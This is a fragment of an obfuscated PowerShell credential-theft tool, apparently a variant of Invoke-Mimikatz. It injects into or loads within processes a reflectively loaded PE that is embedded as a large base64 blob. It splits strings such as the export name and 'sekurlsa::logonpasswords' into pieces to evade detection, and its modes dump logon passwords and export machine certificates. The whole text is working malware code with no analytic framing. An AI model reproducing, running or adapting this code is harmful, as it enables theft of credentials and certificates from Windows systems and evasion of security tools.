        $RemoteProcHandle = [IntPtr]::Zero
        if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
        {
            Throw "Can't supply a ProcId and ProcName, choose one or the other"
        }
        elseif ($ProcName -ne $null -and $ProcName -ne "")
        {
            $Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
            if ($Processes.Count -eq 0)
            {
                Throw "Can't find process $ProcName"
            }
            elseif ($Processes.Count -gt 1)
            {
                $ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
                Write-Output $ProcInfo
                Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
            }
            else
            {
                $ProcId = $Processes[0].ID
            }
        }
        if (($ProcId -ne $null) -and ($ProcId -ne 0))
        {
            $RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
            if ($RemoteProcHandle -eq [IntPtr]::Zero)
            {
                Throw "Couldn't obtain the handle for process ID: $ProcId"
            }
            Write-Verbose "Got the handle for the remote process to inject in to"
        }
        Write-Verbose "Calling Invoke-MemoryLoadLibrary"
        try
        {
            $Processors = Get-WmiObject -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }
        if ($Processors -is [array])
        {
            $Processor = $Processors[0]
        } else {
            $Processor = $Processors
        }
        if ( ( $Processor.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( "Architecture: " + $Processor.AddressWidth + " Process: " + ([System.IntPtr]::Size * 8))
            Write-Error "PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS." -ErrorAction Stop
        }
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$PortableExecutableBytes = [Byte[]][Convert]::FromBase64String($PortableExecutableBytes64)
        }
        else
        {
            [Byte[]]$PortableExecutableBytes = [Byte[]][Convert]::FromBase64String($PortableExecutableBytes32)
        }
        $PortableExecutableBytes[0] = 0
        $PortableExecutableBytes[1] = 0
        $PEHandle = [IntPtr]::Zero
        if ($RemoteProcHandle -eq [IntPtr]::Zero)
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PortableExecutableBytes $PortableExecutableBytes -ExecutableArgs $ExecutableArgs
        }
        else
        {
            $PELoadedInfo = Invoke-MemoryLoadLibrary -PortableExecutableBytes $PortableExecutableBytes -ExecutableArgs $ExecutableArgs -RemoteProcHandle $RemoteProcHandle
        }
        if ($PELoadedInfo -eq [IntPtr]::Zero)
        {
            Throw "Unable to load PE, handle returned is NULL"
        }
        $PEHandle = $PELoadedInfo[0]
        $RemotePEHandle = $PELoadedInfo[1] 
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
        {
                    Write-Verbose "Calling function with WString return type"
                    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName $('po'+'wer'+'she'+'ll_'+'ref'+'lec'+'tiv'+'e_m'+'imi'+'ka'+'tz')
                    if ($WStringFuncAddr -eq [IntPtr]::Zero)
                    {
                        Throw "Couldn't find function address."
                    }
                    $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
                    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExecutableArgs)
                    [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)
                    if ($OutputPtr -eq [IntPtr]::Zero)
                    {
                        Throw "Unable to get output, Output Ptr is NULL"
                    }
                    else
                    {
                        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
                        Write-Output $Output
                        $Win32Functions.LocalFree.Invoke($OutputPtr);
                    }
        }
        elseif (($PEInfoFileType -ieq $('D'+'L'+'L')) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
            if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
            {
                Throw "VoidFunc couldn't be found in the DLL"
            }
            $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
            $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
            $RThreadHandle = Invoke-CreateRemoteThread -ProcHandle $RemoteProcHandle -FirstAddress $VoidFuncAddr -Win32Functions $Win32Functions
        }
        if ($RemoteProcHandle -eq [IntPtr]::Zero)
        {
            Invoke-MemoryFreeLibrary -PEHandle $PEHandle
        }
        else
        {
            $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
            if ($Success -eq $false)
            {
                Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
            }
        }
        Write-Verbose "Done!"
    }
    Main
}
Function Main
{
    if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
    {
        $DebugPreference  = "Continue"
    }
    Write-Verbose "PowerShell ProcessID: $PID"
    if ($PsCmdlet.ParameterSetName -ieq 'GetCreds')
    {
        $ExecutableArgs = 'se'+'ku'+'rl'+'sa'+'::'+'lo'+'go'+'np'+'asswor'+'ds ex'+'it'
    }
    elseif ($PsCmdlet.ParameterSetName -ieq 'GetCerts')
    {
        $ExecutableArgs = "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
    }
    else
    {
        $ExecutableArgs = $Command
    }
    [System.IO.Directory]::SetCurrentDirectory($pwd)
    $EncryptedMimix64 = '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